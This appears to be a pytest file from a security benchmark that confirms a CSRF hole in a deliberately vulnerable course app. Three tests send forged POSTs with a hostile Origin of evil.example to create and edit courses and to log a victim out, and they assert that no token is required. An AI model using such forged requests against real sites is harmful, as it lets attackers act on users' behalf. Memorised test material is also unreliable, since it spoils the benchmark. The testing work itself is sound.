import requests

from helpers import api_url, create_course, json_of, register


def test_exploit_vuln_005_html_course_create_accepts_cross_site_forged_post(app_instance):
    """
    Exploit expectation:
    HTML state-changing endpoints accept a POST with only the victim's session cookie.
    No CSRF token is required, and hostile Origin/Referer values are ignored.
    """
    base_url = app_instance["base_url"]

    victim = requests.Session()

    r = register(victim, base_url, "csrf_victim", "pass123", "CSRF Victim")
    assert r.status_code == 201, r.text
    assert json_of(r)["success"] is True

    forged = victim.post(
        api_url(base_url, "/courses"),
        data={
            "title": "Forged Course",
            "description": "created by a forged cross-site POST",
        },
        headers={
            "Origin": "http://evil.example",
            "Referer": "http://evil.example/poc.html",
        },
        allow_redirects=False,
        timeout=10,
    )

    # Vulnerable behavior: request succeeds without any CSRF token
    assert forged.status_code in (302, 303), forged.text
    location = forged.headers.get("Location", "")
    assert "/courses/" in location


def test_exploit_vuln_005_html_course_update_accepts_cross_site_forged_post(app_instance):
    """
    Exploit expectation:
    Logged-in victim's course can be updated via forged POST without any CSRF token.
    """
    base_url = app_instance["base_url"]

    victim = requests.Session()

    r = register(victim, base_url, "csrf_editor", "pass123", "CSRF Editor")
    assert r.status_code == 201, r.text
    assert json_of(r)["success"] is True

    create_resp = create_course(victim, base_url, "Victim Course", "before csrf update")
    assert create_resp.status_code == 201, create_resp.text
    course_id = int(json_of(create_resp)["course"]["course_id"])

    forged = victim.post(
        api_url(base_url, f"/courses/{course_id}"),
        data={
            "title": "CSRF Updated Title",
            "description": "updated cross-site",
        },
        headers={
            "Origin": "http://evil.example",
            "Referer": "http://evil.example/auto-submit.html",
        },
        allow_redirects=False,
        timeout=10,
    )

    assert forged.status_code in (302, 303), forged.text

    verify = victim.get(api_url(base_url, f"/api/courses/{course_id}"), timeout=10)
    assert verify.status_code == 200, verify.text
    payload = json_of(verify)
    assert payload["course"]["title"] == "CSRF Updated Title"
    assert payload["course"]["description"] == "updated cross-site"


def test_exploit_vuln_005_html_logout_accepts_cross_site_forged_post(app_instance):
    """
    Exploit expectation:
    A malicious site can log the victim out by forcing POST /logout because no CSRF
    token is required for the logout form.
    """
    base_url = app_instance["base_url"]

    victim = requests.Session()

    r = register(victim, base_url, "csrf_logout_user", "pass123", "CSRF Logout User")
    assert r.status_code == 201, r.text
    assert json_of(r)["success"] is True

    me_before = victim.get(api_url(base_url, "/api/auth/me"), timeout=10)
    assert me_before.status_code == 200, me_before.text

    forged = victim.post(
        api_url(base_url, "/logout"),
        headers={
            "Origin": "http://evil.example",
            "Referer": "http://evil.example/logout-poc.html",
        },
        allow_redirects=False,
        timeout=10,
    )

    assert forged.status_code in (302, 303), forged.text

    me_after = victim.get(api_url(base_url, "/api/auth/me"), timeout=10)
    assert me_after.status_code == 401, me_after.text